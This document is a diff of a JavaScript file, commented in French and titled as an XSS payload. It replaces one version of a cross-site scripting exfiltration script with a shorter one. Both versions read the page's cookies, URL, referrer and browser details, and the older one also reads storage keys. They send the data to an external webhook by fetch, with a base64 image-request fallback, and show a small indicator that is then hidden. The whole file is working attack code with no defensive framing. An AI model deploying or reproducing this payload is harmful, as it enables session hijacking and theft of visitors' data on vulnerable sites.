@@ -1,131 +1,57 @@
-// ==================================================
-// XSS DATA EXFILTRATION PAYLOAD
-// Webhook: https://eoj3zpscoeyfiry.m.pipedream.net
-// ==================================================
+// =============================================
+// XSS PAYLOAD - exon2007
+// =============================================
 
-(function() {
-    'use strict';
-    
-    // Attendre que la page soit complètement chargée
-    if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', executePayload);
-    } else {
-        setTimeout(executePayload, 1000);
-    }
+// 1. TEST IMMÉDIAT
+console.log('✅ XSS Payload chargé depuis GitHub');
 
-    function executePayload() {
-        console.log('[XSS] Payload activé - Envoi vers webhook');
-        
-        // Collecter les données
-        const data = collectData();
-        
-        // Envoyer les données au webhook
-        sendToWebhook(data);
-        
-        // Preuve visuelle discrète
-        showSuccessIndicator();
-    }
+// 2. COLLECTE DE DONNÉES
+const data = {
+    url: window.location.href,
+    title: document.title,
+    userAgent: navigator.userAgent,
+    cookies: document.cookie,
+    referrer: document.referrer,
+    timestamp: new Date().toISOString(),
+    screen: `${screen.width}x${screen.height}`,
+    language: navigator.language
+};
 
-    function collectData() {
-        return {
-            // Informations de la page
-            url: window.location.href,
-            title: document.title,
-            domain: window.location.hostname,
-            
-            // Informations navigateur
-            userAgent: navigator.userAgent,
-            language: navigator.language,
-            platform: navigator.platform,
-            
-            // Informations écran
-            screen: {
-                width: screen.width,
-                height: screen.height,
-                colorDepth: screen.colorDepth
-            },
-            
-            // Cookies (si disponibles)
-            cookies: document.cookie || 'no-cookies',
-            
-            // Référent
-            referrer: document.referrer || 'no-referrer',
-            
-            // Timestamp
-            timestamp: new Date().toISOString(),
-            
-            // Informations supplémentaires
-            localStorageKeys: Object.keys(localStorage),
-            sessionStorageKeys: Object.keys(sessionStorage),
-            
-            // Metadata
-            payloadVersion: '1.0',
-            source: 'XSS-Exfiltration'
-        };
-    }
+// 3. ENVOI VERS WEBHOOK
+fetch('https://eoj3zpscoeyfiry.m.pipedream.net', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+        'X-XSS-Source': 'GitHub-Payload'
+    },
+    body: JSON.stringify(data),
+    mode: 'no-cors'
+})
+.then(() => console.log('📨 Données envoyées avec succès'))
+.catch(error => {
+    console.error('❌ Erreur envoi:', error);
+    // Fallback avec image
+    new Image().src = `https://eoj3zpscoeyfiry.m.pipedream.net/?fallback=1&data=${btoa(JSON.stringify(data))}`;
+});
 
-    function sendToWebhook(data) {
-        const webhookURL = 'https://eoj3zpscoeyfiry.m.pipedream.net';
-        
-        // Méthode 1: Fetch avec JSON
-        fetch(webhookURL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'X-XSS-Payload': 'true'
-            },
-            body: JSON.stringify(data),
-            mode: 'no-cors'
-        })
-        .then(response => {
-            console.log('[XSS] Données envoyées avec succès', data);
-        })
-        .catch(error => {
-            console.error('[XSS] Erreur envoi:', error);
-            // Fallback: Méthode 2 avec image tracker
-            fallbackSend(data);
-        });
-    }
+// 4. INDICATEUR VISUEL DISCRET
+const indicator = document.createElement('div');
+indicator.style = `
+    position: fixed;
+    bottom: 10px;
+    right: 10px;
+    width: 10px;
+    height: 10px;
+    background: #00ff00;
+    border-radius: 50%;
+    z-index: 9999;
+    opacity: 0.6;
+    pointer-events: none;
+`;
+document.body.appendChild(indicator);
 
-    function fallbackSend(data) {
-        // Méthode alternative pour contourner CORS
-        const encodedData = btoa(JSON.stringify(data));
-        const img = new Image();
-        img.src = `https://eoj3zpscoeyfiry.m.pipedream.net/?data=${encodedData}&fallback=true`;
-        img.style.display = 'none';
-        document.body.appendChild(img);
-    }
-
-    function showSuccessIndicator() {
-        // Indicateur visuel très discret
-        const indicator = document.createElement('div');
-        indicator.style.cssText = `
-            position: fixed;
-            bottom: 10px;
-            right: 10px;
-            width: 5px;
-            height: 5px;
-            background: #00ff00;
-            border-radius: 50%;
-            z-index: 9999;
-            opacity: 0.7;
-            pointer-events: none;
-        `;
-        document.body.appendChild(indicator);
-        
-        // Supprimer après 5 secondes
-        setTimeout(() => {
-            indicator.style.opacity = '0';
-            setTimeout(() => indicator.remove(), 1000);
-        }, 5000);
-    }
-
-    // Nettoyage
-    window.addEventListener('beforeunload', () => {
-        console.log('[XSS] Nettoyage des traces');
-    });
-
-})();
-
-// Version minimaliste alternative
-console.log('XSS Payload chargé - Webhook active');
+// 5. NETTOYAGE AUTOMATIQUE
+setTimeout(() => {
+    indicator.style.opacity = '0';
+    setTimeout(() => indicator.remove(), 1000);
+}, 5000);
